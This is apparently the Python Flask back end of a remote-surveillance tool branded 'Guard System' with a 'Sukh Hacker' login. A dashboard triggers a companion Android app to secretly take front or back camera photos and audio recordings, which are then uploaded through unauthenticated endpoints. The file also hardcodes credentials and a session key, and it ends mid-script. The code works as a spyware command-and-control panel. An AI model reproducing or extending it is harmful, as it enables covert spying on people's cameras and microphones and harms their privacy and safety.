import os
import logging
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from threading import Thread
import time

# Initialize Flask app FIRST
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production-12345'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Global variable to track recording signal
recording_signal = False
signal_listeners = []
camera_signal = {'active': False}

# Simple authentication
USERNAME = "Sukh Hacker"
PASSWORD = "sukhbir44@007"  # Change this in production

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return render_template_string(LOGIN_HTML, error='Invalid credentials')
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Dashboard route
@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # List all files (audio + photos)
    files = []
    photos = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            file_info = {
                'name': filename,
                'size': os.path.getsize(filepath),
                'modified': os.path.getmtime(filepath)
            }
            
            if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
                files.append(file_info)
            elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                photos.append(file_info)
                
    except FileNotFoundError:
        os.makedirs(upload_dir, exist_ok=True)
    
    # Sort by modification time (newest first)
    files.sort(key=lambda x: x['modified'], reverse=True)
    photos.sort(key=lambda x: x['modified'], reverse=True)
    
    return render_template_string(DASHBOARD_HTML, files=files, photos=photos[:6])  # Latest 6 photos

# DEBUG ROUTE
@app.route('/debug-files')
def debug_files():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    upload_dir = app.config['UPLOAD_FOLDER']
    files_info = []
    
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            files_info.append({
                'name': filename,
                'size': os.path.getsize(filepath),
                'modified': time.ctime(os.path.getmtime(filepath)),
                'type': 'photo' if filename.lower().endswith(('.jpg', '.jpeg', '.png')) else 'audio'
            })
    except Exception as e:
        return f"Error: {e}"
    
    # HTML format mein return karo
    html = "<h1>Debug Files</h1>"
    html += f"<p>Total files: {len(files_info)}</p>"
    html += "<table border='1'><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th></tr>"
    for file in files_info:
        html += f"<tr><td>{file['name']}</td><td>{file['size']} bytes</td><td>{file['type']}</td><td>{file['modified']}</td></tr>"
    html += "</table>"
    return html

# Camera routes
@app.route('/start-camera-signal', methods=['POST'])
def start_camera_signal():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    data = request.get_json()
    camera_type = data.get('camera_type', 'front')
    
    global camera_signal
    camera_signal = {
        'active': True,
        'camera_type': camera_type,
        'timestamp': time.time()
    }
    
    print(f"Camera signal activated - {camera_type} camera")
    return jsonify({'ok': True, 'message': f'{camera_type} camera signal sent'})

@app.route('/check-camera-signal')
def check_camera_signals():
    global camera_signal
    if camera_signal and camera_signal.get('active'):
        if time.time() - camera_signal.get('timestamp', 0) < 30:
            return jsonify({
                'capture': True,
                'camera_type': camera_signal.get('camera_type', 'front')
            })
    
    camera_signal = {'active': False}
    return jsonify({'capture': False})

@app.route('/camera-signal-received', methods=['POST'])
def camera_signal_received():
    global camera_signal
    camera_signal = {'active': False}
    return jsonify({'ok': True})

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    print("📸 Upload photo endpoint called")
    
    if not session.get('logged_in'):
        print("❌ Unauthorized access")
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    print("📸 Request files:", list(request.files.keys()))
    
    if 'photo' not in request.files:
        print("❌ No photo file in request")
        return jsonify({'ok': False, 'error': 'No photo file'}), 400
    
    photo_file = request.files['photo']
    print("📸 Photo file details:")
    print("   - Filename:", photo_file.filename)
    print("   - Content type:", photo_file.content_type)
    print("   - Content length:", photo_file.content_length if photo_file.content_length else "Unknown")
    
    if photo_file.filename == '':
        print("❌ Empty filename")
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if photo_file:
        timestamp = str(int(time.time()))
        filename = f"camera_photo_{timestamp}.jpg"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        try:
            photo_file.save(filepath)
            file_size = os.path.getsize(filepath)
            print(f"✅ Photo saved: {filename} ({file_size} bytes)")
            print(f"✅ File path: {filepath}")
            print(f"✅ File exists: {os.path.exists(filepath)}")
            
            return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
        except Exception as e:
            print(f"❌ File save error: {e}")
            return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
    
    print("❌ Unknown upload failure")
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# MOBILE UPLOAD PHOTO ROUTE - ANDROID APP KE LIYE (NO LOGIN REQUIRED)
@app.route('/mobile-upload-photo', methods=['POST'])
def mobile_upload_photo():
    try:
        print("📸 Mobile photo upload endpoint called")
        print("📸 Request files:", list(request.files.keys()))
        
        if 'photo' not in request.files:
            print("❌ No photo file in request")
            return jsonify({'ok': False, 'error': 'No photo file'}), 400
        
        photo_file = request.files['photo']
        print("📸 Photo file details:")
        print("   - Filename:", photo_file.filename)
        print("   - Content type:", photo_file.content_type)
        print("   - Content length:", photo_file.content_length if photo_file.content_length else "Unknown")
        
        if photo_file.filename == '':
            print("❌ Empty filename")
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        if photo_file:
            timestamp = str(int(time.time()))
            filename = f"mobile_photo_{timestamp}.jpg"
            
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            try:
                photo_file.save(filepath)
                file_size = os.path.getsize(filepath)
                print(f"✅ Mobile photo saved: {filename} ({file_size} bytes)")
                print(f"✅ File path: {filepath}")
                print(f"✅ File exists: {os.path.exists(filepath)}")
                
                return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
            except Exception as e:
                print(f"❌ File save error: {e}")
                return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
        
        print("❌ Unknown upload failure")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500
        
    except Exception as e:
        print(f"❌ Mobile photo upload error: {e}")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Recording signal routes
@app.route('/start-recording', methods=['POST'])
def start_recording():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    global recording_signal
    recording_signal = True
    
    record_time = 15
    if request.is_json:
        data = request.get_json()
        record_time = data.get('record_time', 15)
    
    print(f"Recording signal activated - {record_time} seconds")
    
    for listener in signal_listeners:
        listener['active'] = False
    
    return jsonify({'ok': True, 'message': f'Recording signal sent to app - {record_time}s', 'record_time': record_time})

@app.route('/check-signal')
def check_signal():
    global recording_signal
    return jsonify({'record': recording_signal})

@app.route('/signal-received', methods=['POST'])
def signal_received():
    global recording_signal
    recording_signal = False
    return jsonify({'ok': True})

# File management routes
@app.route('/files/<filename>')
def serve_file(filename):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    safe_filename = secure_filename(filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
    
    if not os.path.exists(filepath):
        return "File not found", 404
    
    return send_file(filepath)

@app.route('/delete/<filename>', methods=['POST'])
def delete_file(filename):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    safe_filename = secure_filename(filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
    
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({'ok': True, 'message': 'File deleted'})
    
    return jsonify({'ok': False, 'error': 'File not found'}), 404

# Recorder page
@app.route('/recorder')
def recorder():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(RECORDER_HTML)

# Upload route for recorder
@app.route('/upload', methods=['POST'])
def upload_recording():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    if 'audio' not in request.files:
        return jsonify({'ok': False, 'error': 'No audio file'}), 400
    
    audio_file = request.files['audio']
    if audio_file.filename == '':
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if audio_file:
        filename = secure_filename(audio_file.filename)
        name, ext = os.path.splitext(filename)
        timestamp = str(int(time.time()))
        filename = f"{name}_{timestamp}{ext}"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Mobile upload route
@app.route('/mobile-upload', methods=['POST'])
def mobile_upload():
    try:
        print("Files received:", list(request.files.keys()))
        
        audio_file = None
        if 'file' in request.files:
            audio_file = request.files['file']
            print("Using 'file' field")
        elif 'audio' in request.files:
            audio_file = request.files['audio']
            print("Using 'audio' field")
        
        if not audio_file or audio_file.filename == '':
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        timestamp = str(int(time.time()))
        filename = f"android_recording_{timestamp}.m4a"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        print(f"✅ Mobile recording uploaded: {filename} ({os.path.getsize(filepath)} bytes)")
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    except Exception as e:
        print(f"❌ Upload error: {e}")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Get latest photos API
@app.route('/get-latest-photos')
def get_latest_photos():
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    photos = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            if filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                filepath = os.path.join(upload_dir, filename)
                photos.append({
                    'name': filename,
                    'url': f"/files/{filename}",
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
    except FileNotFoundError:
        pass
    
    photos.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify({'ok': True, 'photos': photos[:6]})

# COOL BLACK THEME LOGIN PAGE
LOGIN_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Guard System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .login-container {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 50px 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 183, 255, 0.1), transparent);
            animation: shine 6s infinite linear;
        }
        
        @keyframes shine {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo h1 {
            color: #00b7ff;
            font-size: 2.5rem;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
            margin-bottom: 10px;
        }
        
        .logo p {
            color: #888;
            font-size: 1rem;
        }
        
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            color: #00b7ff;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: #fff;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #00b7ff;
            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .form-group input::placeholder {
            color: #666;
        }
        
        .btn-login {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-login:hover {
            background: linear-gradient(135deg, #00ccff 0%, #00aadd 100%);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
            transform: translateY(-2px);
        }
        
        .btn-login:active {
            transform: translateY(0);
        }
        
        .error {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            color: #ff4444;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-top: 20px;
            font-size: 0.9rem;
        }
        
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .particle {
            position: absolute;
            background: rgba(0, 183, 255, 0.3);
            border-radius: 50%;
            animation: float 6s infinite ease-in-out;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="login-container">
        <div class="logo">
            <h1>🚀 GUARD SYSTEM</h1>
            <p>Secure Access Portal</p>
        </div>
        
        <form method="POST">
            <div class="form-group">
                <label>👤 Username</label>
                <input type="text" name="username" required placeholder="Enter your username">
            </div>
            
            <div class="form-group">
                <label>🔒 Password</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            
            <button type="submit" class="btn-login">🔓 Login to System</button>
            
            {% if error %}
            <div class="error">⚠️ {{ error }}</div>
            {% endif %}
        </form>
    </div>

    <script>
        // Create floating particles
        const particlesContainer = document.getElementById('particles');
        const particleCount = 15;
        
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            
            const size = Math.random() * 20 + 5;
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${Math.random() * 100}vw`;
            particle.style.top = `${Math.random() * 100}vh`;
            particle.style.animationDelay = `${Math.random() * 5}s`;
            particle.style.opacity = Math.random() * 0.5 + 0.1;
            
            particlesContainer.appendChild(particle);
        }
        
        // Add input focus effects
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'scale(1.02)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'scale(1)';
            });
        });
    </script>
</body>
</html>
"""

# COOL BLACK THEME DASHBOARD
DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Guard System - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header Styles */
        header {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 25px 30px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        .header-left h1 {
            color: #00b7ff;
            font-size: 2.2rem;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
            margin-bottom: 5px;
        }
        
        .header-left p {
            color: #888;
            font-size: 1rem;
        }
        
        .header-right {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        /* Button Styles */
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 12px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
            color: white;
        }
        
        .btn-recorder {
            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
        }
        
        /* Control Sections */
        .control-section {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        .section-title {
            color: #00b7ff;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 2px solid rgba(0, 183, 255, 0.3);
            padding-bottom: 12px;
        }
        
        /* Control Groups */
        .control-group {
            margin-bottom: 20px;
        }
        
        .control-group label {
            display: block;
            color: #00b7ff;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .control-group input {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            padding: 12px 15px;
            font-size: 1rem;
            width: 120px;
            transition: all 0.3s ease;
        }
        
        .control-group input:focus {
            outline: none;
            border-color: #00b7ff;
            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
        }
        
        /* Control Buttons */
        .controls {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .btn-control {
            padding: 14px 25px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            color: white;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        .btn-camera-front {
            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
            color: white;
        }
        
        .btn-camera-back {
            background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
            color: white;
        }
        
        /* Status Indicators */
        .signal-status {
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 0.9rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-left: 15px;
        }
        
        .signal-active {
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            box-shadow: 0 0 20px rgba(40, 167, 69, 0.5);
        }
        
        .signal-inactive {
            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
        }
        
        .camera-active {
            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
            box-shadow: 0 0 20px rgba(23, 162, 184, 0.5);
        }
        
        /* Photo Gallery */
        .photo-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .photo-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .photo-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 183, 255, 0.3);
            border-color: #00b7ff;
        }
        
        .photo-item img {
            width: 100%;
            height: 160px;
            object-fit: cover;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .photo-item img:hover {
            transform: scale(1.05);
        }
        
        .photo-info {
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
        }
        
        .photo-name {
            font-size: 0.8rem;
            color: #ccc;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 5px;
        }
        
        .photo-size {
            font-size: 0.75rem;
            color: #888;
        }
        
        /* Files Table */
        .files-section {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            margin-top: 25px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 15px;
            overflow: hidden;
        }
        
        th {
            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
            color: white;
            padding: 18px 15px;
            text-align: left;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.85rem;
        }
        
        td {
            padding: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            color: #ccc;
        }
        
        tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        /* Small Buttons */
        .btn-small {
            padding: 8px 15px;
            border: none;
            border-radius: 8px;
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn-download {
            background: rgba(0, 183, 255, 0.2);
            color: #00b7ff;
            border: 1px solid rgba(0, 183, 255, 0.3);
        }
        
        .btn-delete {
            background: rgba(220, 53, 69, 0.2);
            color: #dc3545;
            border: 1px solid rgba(220, 53, 69, 0.3);
        }
        
        .btn-small:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        /* Audio Player */
        audio {
            width: 200px;
            height: 40px;
            border-radius: 20px;
        }
        
        /* Refresh Button */
        .refresh-btn {
            background: rgba(108, 117, 125, 0.3);
            color: #ccc;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.8rem;
            margin-left: 15px;
            transition: all 0.3s ease;
        }
        
        .refresh-btn:hover {
            background: rgba(108, 117, 125, 0.5);
            transform: translateY(-2px);
        }
        
        /* Info Text */
        .info-text {
            color: #888;
            font-size: 0.9rem;
            margin-top: 10px;
        }
        
        /* Stats */
        .stats {
            display: flex;
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            flex: 1;
        }
        
        .stat-number {
            color: #00b7ff;
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #888;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="header-left">
                <h1>🚀 GUARD SYSTEM</h1>
                <p>Remote Audio & Camera Control Dashboard</p>
            </div>
            <div class="header-right">
                <a href="/logout" class="btn btn-logout">🚪 Logout</a>
                <a href="/recorder" class="btn btn-recorder">🎤 Recorder</a>
            </div>
        </header>

        <!-- Camera Controls -->
        <div class="control-section">
            <div class="section-title">
                📸 Remote Camera Control
                <button class="refresh-btn" onclick="refreshPhotos()">🔄 Refresh Photos</button>
            </div>
            
            <div class="controls">
                <button class="btn-control btn-camera-front" onclick="startCamera('front')">📱 Front Camera</button>
                <button class="btn-control btn-camera-back" onclick="startCamera('back')">📷 Back Camera</button>
                <button class="btn-control btn-stop" onclick="stopCamera()">⏹️ Stop Camera</button>
                <span id="cameraStatus" class="signal-status signal-inactive">Camera: Inactive</span>
            </div>
            
            <div id="cameraInfo" class="info-text"></div>
            
            <!-- Photo Gallery -->
            <div class="section-title" style="margin-top: 30px;">🖼️ Latest Photos</div>
            <div class="photo-gallery" id="photoGallery">
                {% for photo in photos %}
                <div class="photo-item">
                    <img src="{{ url_for('serve_file', filename=photo.name) }}" 
                         onclick="openPhoto('{{ url_for('serve_file', filename=photo.name) }}')"
                         alt="{{ photo.name }}"
                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMzMzIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0iIzk5OSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlBob3RvIEVycm9yPC90ZXh0Pjwvc3ZnPg=='">
                    <div class="photo-info">
                        <div class="photo-name">{{ photo.name }}</div>
                        <div class="photo-size">{{ '%.1f'|format(photo.size / 1024) }} KB</div>
                    </div>
                </div>
                {% endfor %}
                {% if photos|length == 0 %}
                <div style="grid-column:1/-1;text-align:center;padding:40px;color:#666;">
                    📷 No photos captured yet. Click camera buttons above to capture photos.
                </div>
                {% endif %}
            </div>
        </div>

        <!-- Recording Controls -->
        <div class="control-section">
            <div class="section-title">🎤 Audio Recording Control</div>
            
            <div class="control-group">
                <label for="recordTime">⏱️ Recording Duration (seconds)</label>
                <input type="number" id="recordTime" value="15" min="5" max="60">
            </div>
            
            <div class="controls">
                <button class="btn-control btn-start" onclick="startRecording()">🎙️ Start Recording</button>
                <button class="btn-control btn-stop" onclick="stopRecording()">⏹️ Stop Signal</button>
                <span id="signalStatus" class="signal-status signal-inactive">Signal: Inactive</span>
            </div>
            
            <div id="recordingInfo" class="info-text"></div>
        </div>

        <!-- Stats -->
        <div class="stats">
            <div class="stat-item">
                <div class="stat-number">{{ files|length + photos|length }}</div>
                <div class="stat-label">Total Files</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ files|length }}</div>
                <div class="stat-label">Audio Files</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ photos|length }}</div>
                <div class="stat-label">Photos</div>
            </div>
        </div>

        <!-- Files Table -->
        <div class="files-section">
            <div class="section-title">📁 File Management</div>
            
            <table>
                <thead>
                    <tr>
                        <th>Filename</th>
                        <th>Size</th>
                        <th>Type</th>
                        <th>Preview</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                {% for f in files %}
                    <tr>
                        <td style="max-width: 300px; word-break: break-all;">{{ f.name }}</td>
                        <td>{{ '%.1f'|format(f.size / 1024) }} KB</td>
                        <td>🎧 Audio</td>
                        <td>
                            <audio controls preload="none">
                                <source src="{{ url_for('serve_file', filename=f.name) }}" type="audio/mp4">
                            </audio>
                        </td>
                        <td style="display: flex; gap: 8px;">
                            <a class="btn-small btn-download" href="{{ url_for('serve_file', filename=f.name) }}" download>⬇️ Download</a>
                            <form method="post" action="{{ url_for('delete_file', filename=f.name) }}" 
                                  onsubmit="return confirm('Delete file\\\\n\\\\n' + '{{f.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
                                <button class="btn-small btn-delete" type="submit">🗑️ Delete</button>
                            </form>
                        </td>
                    </tr>
                {% endfor %}
                {% for p in photos %}
                    <tr>
                        <td style="max-width: 300px; word-break: break-all;">{{ p.name }}</td>
                        <td>{{ '%.1f'|format(p.size / 1024) }} KB</td>
                        <td>📸 Photo</td>
                        <td>
                            <img src="{{ url_for('serve_file', filename=p.name) }}" 
                                 style="width: 80px; height: 60px; object-fit: cover; border-radius: 8px; cursor: pointer;" 
                                 onclick="openPhoto('{{ url_for('serve_file', filename=p.name) }}')">
                        </td>
                        <td style="display: flex; gap: 8px;">
                            <a class="btn-small btn-download" href="{{ url_for('serve_file', filename=p.name) }}" download>⬇️ Download</a>
                            <form method="post" action="{{ url_for('delete_file', filename=p.name) }}" 
                                  onsubmit="return confirm('Delete photo\\\\n\\\\n' + '{{p.name}}' + '\\\\n\\\\nThis cannot be undone. Continue?')">
                                <button class="btn-small btn-delete" type="submit">🗑️ Delete</button>
                            </form>
                        </td>
                    </tr>
                {% endfor %}
                {% if files|length == 0 and photos|length == 0 %}
                    <tr>
                        <td colspan="5" style="text-align: center; padding: 40px; color: #666;">
                            📭 No files available
                        </td>
                    </tr>
                {% endif %}
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let signalCheckInterval;
        let cameraCheckInterval;
        let recordingTime = 15;

        // Recording Functions
        function startRecording() {
            recordingTime = parseInt(document.getElementById('recordTime').value) || 15;
            if (recordingTime < 5) recordingTime = 5;
            if (recordingTime > 60) recordingTime = 60;
            
            document.getElementById('recordingInfo').textContent = `Recording will be ${recordingTime} seconds`;
            
            fetch('/start-recording', { 
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ record_time: recordingTime })
            })
            .then(r => r.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById('signalStatus').className = 'signal-status signal-active';
                    document.getElementById('signalStatus').textContent = 'Signal: Active';
                    
                    signalCheckInterval = setInterval(checkSignalStatus, 2000);
